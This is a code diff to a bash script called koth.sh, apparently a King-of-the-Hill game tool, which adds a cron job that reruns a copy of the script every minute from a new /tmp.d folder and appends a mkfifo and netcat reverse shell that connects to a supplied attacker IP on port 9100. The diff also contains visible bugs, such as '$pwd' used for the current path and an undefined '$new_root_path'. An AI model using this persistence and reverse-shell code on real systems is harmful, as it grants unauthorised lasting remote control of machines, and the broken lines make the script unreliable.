@@ -2,24 +2,27 @@
 
 function King() {
     echo "[+] Starting execution"
-    echo "[+] Cd to /tmp folder and mkdir ..."
-    cd /tmp && mkdir ... 
-    echo "[+] path : $(pwd)"
+    
+    root_path=$pwd
+    echo "[+] Cd to / make folder tmp.d and cd tmp.d"
+    cd / && mkdir tmp.d && cd tmp.d
+    new_folder_path=$pwd
+    echo "[+] path : $new_folder_path"
+    cd $root_path
+    cat < koth.sh > shell.sh
+    mv shell.sh $new_folder_path
+    echo "[+] Moving shell.sh to $new_root_path"
     echo "[+] Adding Crontab"
-    $(crontab -l 2>/dev/null; echo "* * * * * /bin/bash /tmp/.../koth.sh") | crontab -
+    $(crontab -l 2>/dev/null; echo "* * * * * /bin/bash $new_folder_path/shell.sh") | crontab -
     # Check if the script is running as root
     if [ "$EUID" -ne 0 ]; then
         echo "[-] Please run as root."
         exit 1
     fi
 
-    # Navigate to the /root directory
-    cd /root || { echo "[-] Failed to change to /root"; exit 1; }
-    echo "[+] Root Path: $(pwd)"
-
     # Check if an argument (your IP address) is provided
     if [ -z "$1" ]; then
-        echo "[-] No IP address provided. Usage: ./king.sh <YOUR_IP_ADDRESS>"
+        echo "[-] No IP address provided. Usage: ./koth.sh <YOUR_IP_ADDRESS>"
         exit 1
     fi
 
@@ -41,6 +44,9 @@ function King() {
             fi
         fi
     done
+
+    # revshell
+    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $YOUR_IP 9100 >/tmp/f
 }
 
 # Call the function with the provided argument
